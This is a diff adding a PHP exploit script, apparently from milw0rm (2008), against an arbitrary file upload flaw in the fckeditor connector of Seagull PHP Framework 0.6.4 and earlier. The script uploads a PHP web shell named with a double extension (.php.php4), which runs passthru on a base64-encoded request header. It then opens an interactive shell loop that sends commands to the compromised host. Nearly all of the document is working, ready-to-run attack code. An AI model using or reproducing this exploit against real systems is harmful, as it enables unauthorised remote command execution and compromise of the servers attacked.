@@ -1,0 +1,117 @@
+<?php
+
+/*
+	------------------------------------------------------------------------
+	Seagull PHP Framework <= 0.6.4 (fckeditor) Arbitrary File Upload Exploit
+	------------------------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://seagullproject.org/
+	details..: works only with a specific server configuration (e.g. an Apache server with the mod_mime module installed)
+
+	[-] vulnerable code in /www/tinyfck/filemanager/connectors/php/config.php
+	
+	33.	// SECURITY: You must explicitelly enable this "connector". (Set it to "true").
+	34.	$Config['Enabled'] = true ;
+	35.	
+	36.	// Path to user files relative to the document root.
+	37.	$Config['UserFilesPath'] = SGL_BASE_URL . '/images/' ;
+	38.	
+	39.	// Fill the following value it you prefer to specify the absolute path for the
+	40.	// user files directory. Usefull if you are using a virtual directory, symbolic
+	41.	// link or alias. Examples: 'C:\\MySite\\UserFiles\\' or '/root/mysite/UserFiles/'.
+	42.	// Attention: The above 'UserFilesPath' must point to the same directory.
+	43.	$Config['UserFilesAbsolutePath'] = SGL_WEB_ROOT.'/images/';
+	44.	
+	45.	$Config['AllowedExtensions']['File']    = array() ;
+	46.	$Config['DeniedExtensions']['File']     = array('php','php3','php5','phtml','asp','aspx','ascx','jsp','cfm', [...]
+	47.	
+	48.	$Config['AllowedExtensions']['Image']   = array('jpg','gif','jpeg','png') ;
+	49.	$Config['DeniedExtensions']['Image']    = array() ;
+	50.	
+	51.	$Config['AllowedExtensions']['Flash']   = array('swf','fla') ;
+	52.	$Config['DeniedExtensions']['Flash']    = array() ;
+	53.	
+	54.	$Config['AllowedExtensions']['Media']   = array('swf','fla','jpg','gif','jpeg','png','avi','mpg','mpeg') ;
+	55.	$Config['DeniedExtensions']['Media']    = array() ;
+	
+	with a default configuration of this script, an attacker might be able to upload arbitrary
+	files containing malicious PHP code due to multiple file extensions isn't properly checked
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+define(STDIN, fopen("php://stdin", "r"));
+
+function http_send($host, $packet)
+{
+	$sock = fsockopen($host, 80);
+	while (!$sock)
+	{
+		print "\n[-] No response from {$host}:80 Trying again...";
+		$sock = fsockopen($host, 80);
+	}
+	fputs($sock, $packet);
+	while (!feof($sock)) $resp .= fread($sock, 1024);
+	fclose($sock);
+	return $resp;
+}
+
+print "\n+--------------------------------------------------------------------+";
+print "\n| Seagull <= 0.6.4 (fckeditor) Arbitrary File Upload Exploit by EgiX |";
+print "\n+--------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage......: php $argv[0] host path\n";
+	print "\nExample....: php $argv[0] localhost /";
+	print "\nExample....: php $argv[0] localhost /seagull/\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$filename  = md5(time()).".php.php4";
+$connector = "tinyfck/filemanager/connectors/php/connector.php";
+
+$payload  = "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n\r\n";
+$payload .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\r\n";
+$payload .= "--o0oOo0o--\r\n";
+
+$packet  = "POST {$path}{$connector}?Command=FileUpload&Type=File&CurrentFolder=%2f HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet .= $payload;
+
+preg_match("/OnUploadCompleted\((.*),\"(.*)\"\)/i", http_send($host, $packet), $html);
+if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]})\n");
+
+while(1)
+{
+	print "\nseagull-shell# ";
+	$cmd = trim(fgets(STDIN));
+	if ($cmd != "exit")
+	{
+		$packet = "GET {$path}images/File/{$html[2]} HTTP/1.0\r\n";
+		$packet.= "Host: {$host}\r\n";
+		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
+		$packet.= "Connection: close\r\n\r\n";
+		$output = http_send($host, $packet);
+		if (!preg_match("/_code_/", $output)) die("\n[-] Exploit failed...\n");
+		$shell  = explode("_code_", $output);
+		print "\n{$shell[1]}";
+	}
+	else break;
+}
+
+?>
+
+# milw0rm.com [2008-06-26]
